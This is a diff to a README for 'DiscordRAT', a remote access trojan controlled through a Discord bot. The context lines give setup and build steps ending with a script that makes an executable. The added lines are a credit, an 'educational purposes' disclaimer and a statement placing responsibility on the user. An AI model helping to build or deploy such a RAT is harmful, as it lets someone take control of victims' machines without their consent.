@@ -102,3 +102,8 @@ make a messagebox popup on their screen with a custom message
          - Replace `GUILD_ID_HERE` with the id of your server that you want the bot to be in ([server id?](https://support.discord.com/hc/en-us/articles/206346498-Where-can-I-find-my-User-Server-Message-ID))
 5. Now your ready to invite your bot to your server, simply follow [this guide](https://discordjs.guide/preparations/adding-your-bot-to-servers.html#bot-invite-links)
 6. When your done with all of that, simply open **build-exe.bat** and enter a name for the exe and now your done!
+
+Created by Rdimo#6969 | https://rdimo.github.io/CheatAway
+|⚠️・this Discord rat was made for educational purposes・⚠️|
+|-------------------------------------------------|
+By using DiscordRAT, you agree that you hold responsibility and accountability of any consequences caused by your actions
